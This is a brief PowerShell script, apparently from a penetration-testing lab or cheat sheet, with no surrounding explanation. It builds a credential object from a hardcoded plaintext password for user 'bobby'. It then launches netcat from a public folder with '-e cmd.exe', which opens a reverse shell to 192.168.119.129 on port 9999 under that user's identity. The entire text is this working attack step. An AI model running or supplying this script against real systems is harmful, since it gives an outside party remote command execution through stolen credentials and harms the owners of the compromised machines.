$secpasswd = ConvertTo-SecureString "Password123" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("bobby", $secpasswd)
$computer = "Computer1"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","192.168.119.129 9999 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
